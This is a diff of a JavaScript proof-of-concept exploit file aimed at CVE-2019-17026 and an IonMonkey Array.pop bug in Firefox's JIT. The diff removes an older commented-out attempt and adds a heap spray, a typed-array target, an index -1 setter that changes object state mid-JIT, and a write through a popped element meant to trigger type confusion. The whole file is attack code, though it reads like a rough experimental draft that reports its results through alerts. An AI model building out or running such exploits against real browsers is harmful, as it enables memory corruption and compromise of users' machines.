@@ -1,68 +1,15 @@
-/*
+// Combined POC for CVE-2019-17026 and IonMonkey Array.pop
 const NUM_ITERATIONS = 10;
-const ARRAY_LENGTH = 10000; 
-
-
-let arr1 = [];
-let arr2 = [1.1, 2.2, , 4.4];
-let TARGET = { secret: 0x12345678 };
-let BUFFER = new Array(10000);
-
-
-arr2.__defineSetter__("-1", function(x) {
-    alert('Setter called on -1, deleting arr1.x');
-    delete arr1.x;
-});
-
-function f(b, index, target) {
-    let ai = { x4: 42 };
-    let aT = { x4: 1337 };
-    arr1.x = ai;
-    if (b) arr1.x = aT;
-    arr2[index] = 1.1;
-    try {
-        let result = arr1.x.x4;
-        alert('Result of arr1.x.x4 = ' + result);
-    } catch (e) {
-        alert('Crash or Type Confusion: ' + e);
-    }
-    if (index === -1 && target) {
-        arr1.x = target;
-    }
-    return arr1.x ? arr1.x.x4 : null;
-}
-
-function main() {
-    for (let i = 0; i < NUM_ITERATIONS; i++) {
-        arr2.length = 4;
-        f((i & 1) === 1, 5, null);
-    }
-    f(true, -1, TARGET); // Trigger with TARGET
-    alert('Final arr1.x.x4 = ' + (arr1.x ? arr1.x.x4 : 'undefined'));
-    alert('TARGET.secret = ' + TARGET.secret);
-}
-
-main();
-*/
-
-
-
-
-
-
-
-
-
-
-
-const NUM_ITERATIONS = 10;
-const ARRAY_LENGTH = 1000; 
+const ARRAY_LENGTH = 1000;
+const SPRAY_SIZE = 100000;
 
 let OBJ = { a: 41 };
 OBJ.a = 42;
-let TARGET = { secret: 0x12345678, extra: 0x87654321 };
-let OTHER = { value: 0xdeadbeef };
-let BUFFER = new Array(10000); // 
+let TARGET = { secret: 0x12345678 };
+let ab = new ArrayBuffer(0x1000);
+let y = new Uint32Array(ab);
+let BUFFER = new Array(1000000); // Heap Spray base
+let spray = new Array(SPRAY_SIZE).fill({ data: y });
 
 function f(obj, idx, targetAddr) {
     let v = OBJ.a;
@@ -71,10 +18,18 @@ function f(obj, idx, targetAddr) {
     if (targetAddr && idx === -1) {
         try {
             obj[-1] = targetAddr;
-            alert('Attempted to write TARGET address to obj[-1]: ' + targetAddr);
+            alert('Attempted to write TARGET to obj[-1]: ' + targetAddr.secret);
         } catch (e) {
             alert('Error writing to obj[-1]: ' + e);
         }
+    }
+    // محاولة Array.pop
+    const v11 = obj.pop();
+    try {
+        v11[0] = 0xdeadbeef;
+        alert('Write to v11[0] succeeded with value: ' + v11[0].toString(16));
+    } catch (e) {
+        alert('Pop Crash or Type Confusion: ' + e);
     }
     alert('After write, OBJ.a = ' + OBJ.a);
     return OBJ.a;
@@ -88,7 +43,7 @@ function main() {
         let obj = new Array(ARRAY_LENGTH);
         Object.defineProperty(obj, '-1', {
             set(value) {
-                alert('Setter triggered for value ' + value + ', changing OBJ.a to 1337');
+                alert('Setter triggered, changing OBJ.a to 1337');
                 OBJ.a = 1337;
             }
         });
@@ -103,8 +58,7 @@ function main() {
     }
     alert('Final OBJ.a = ' + OBJ.a);
     alert('TARGET.secret = ' + TARGET.secret);
-    alert('TARGET.extra = ' + TARGET.extra);
-    alert('OTHER.value = ' + OTHER.value);
+    alert('y[0] = ' + y[0].toString(16));
 }
 
 main();
